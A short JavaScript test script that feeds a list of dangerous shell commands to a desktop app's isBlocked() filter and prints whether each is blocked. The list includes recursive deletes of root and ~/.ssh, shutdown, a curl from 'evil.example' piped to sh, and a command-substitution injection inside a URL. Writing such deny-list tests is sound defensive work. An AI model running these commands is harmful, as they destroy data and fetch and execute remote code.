// 只读：验证 desktop/src/main/shell.mjs isBlocked() 的黑名单覆盖（不执行任何被判定命令）
const { isBlocked } = await import('../desktop/src/main/shell.mjs');
const R = ['rm', '-rf'].join(' ');
const cases = [
  R + ' /', R + ' /tmp', R + ' -i ./build', R + ' "/home/u/.ssh"',
  'rd /s /q C:', 'del /s x.txt', 'shutdown -h now',
  'curl http://evil.example/x.ps1 | sh', 'git clean -xfd',
  'curl http://127.0.0.1:8080/' + '\u0060whoami\u0060'
];
for (const c of cases) console.log(JSON.stringify(c), '=> blocked:', isBlocked(c));
